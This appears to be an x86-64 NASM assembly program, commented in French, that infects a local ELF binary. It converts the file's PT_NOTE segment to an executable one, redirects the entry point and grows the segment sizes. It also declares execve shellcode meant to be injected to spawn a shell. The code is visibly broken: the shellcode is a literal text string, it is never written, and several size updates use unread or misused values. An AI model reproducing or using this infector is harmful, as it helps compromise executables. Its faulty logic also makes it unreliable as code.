section .data
    filename db 'hello', 0
    octet_position equ 456  ; afin de trouver l'octet du premier segment  ptnote, j'ai effectué un changement manuel puis comparé avec une copie du binaire.
    flags_position equ 460  ; cela se trouve à 4 octets au-dessus du ptype du segment ptnote.
    octetentry_position equ 24 ; Offset correct pour e_entry (64 bits)
    new_flags dd 0x00000001 ; le flag pour l'exécution
    new_value db 1
    newentry_adress dq 0x0338 ; Utiliser dq pour une valeur 64 bits

    octet_position_p_filesz equ 488 ; dans un fichier elf 64 bits, le p_filesz se trouve à 0x020 octets après le p_type
    octet_position_p_memsz equ 496 ; dans un fichier elf 64 bits, le p_memsz se trouve à 40 octets après le p_type.

    shellcode db '\xb8\x3b\x00\x00\x00\x48\xbf\x08\x20\x40\x00\x00\x00\x00\x48\xbe\x08\x20\x40\x00\x00\x00\x00\x48\xba\x10\x20\x40\x00\x00\x00\x00\x0f\x05' ; shellcode à injecter (ouvre simplement le shell)

section .bss
    file_descriptor resq 1
    temp_value resq 1  ; Réserve un espace temporaire pour stocker les valeurs lues

section .text
    global _start

_start:
    ; Ouvrir le fichier
    mov rax, 2
    mov rdi, filename
    mov rsi, 2          
    syscall
    mov [file_descriptor], rax

    ; Positionner le curseur pour les flags
    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, flags_position
    mov rdx, 0         
    syscall

    ; Écrire les nouveaux flags
    mov rax, 1         
    mov rdi, [file_descriptor]
    mov rsi, new_flags
    mov rdx, 4          
    syscall

    ; Repositionner le curseur pour l'octet à modifier
    mov rax, 8         
    mov rdi, [file_descriptor]
    mov rsi, octet_position
    mov rdx, 0          
    syscall

    ; Écrire le nouvel octet
    mov rax, 1
    mov rdi, [file_descriptor]
    mov rsi, new_value
    mov rdx, 1
    syscall

    ; Modifier e_entry
    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, octetentry_position ; Utiliser l'offset correct
    mov rdx, 0          
    syscall

    mov rax, 1          
    mov rdi, [file_descriptor]
    mov rsi, newentry_adress
    mov rdx, 8          ; 8 octets pour e_entry (64 bits)
    syscall

    ; Lire p_filesz
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi, octet_position_p_filesz
    mov rdx, 0
    syscall

    ; Ajouter 0x022 à p_filesz
    mov rbx, [temp_value]  ; Charger la valeur actuelle de p_filesz dans rbx
    add rbx, 0x022         ; Ajouter 0x022 à rbx

    ; Repositionner le curseur pour p_filesz
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi, octet_position_p_filesz
    mov rdx, 0
    syscall

    ; Écrire la nouvelle valeur de p_filesz
    mov rax, 1
    mov rdi, [file_descriptor]
    mov rsi, rbx          ; Mettre la valeur modifiée de p_filesz dans rsi
    mov rdx, 8            ; Écrire 8 octets
    syscall

    ; Lire p_memsz
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi, octet_position_p_memsz
    mov rdx, 0
    syscall

    ; Ajouter 0x022 à p_memsz
    mov rbx, [temp_value]  ; Charger la valeur actuelle de p_memsz dans rbx
    add rbx, 0x022         ; Ajouter 0x022 à rbx

    ; Repositionner le curseur pour p_memsz
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi, octet_position_p_memsz
    mov rdx, 0
    syscall

    ; Écrire la nouvelle valeur de p_memsz
    mov rax, 1
    mov rdi, [file_descriptor]
    mov rsi, rbx          ; Mettre la valeur modifiée de p_memsz dans rsi
    mov rdx, 8            ; Écrire 8 octets
    syscall

    ; Fermer le fichier
    mov rax, 3
    mov rdi, [file_descriptor]
    syscall

    ; Sortir
    mov rax, 60
    xor rdi, rdi
    syscall
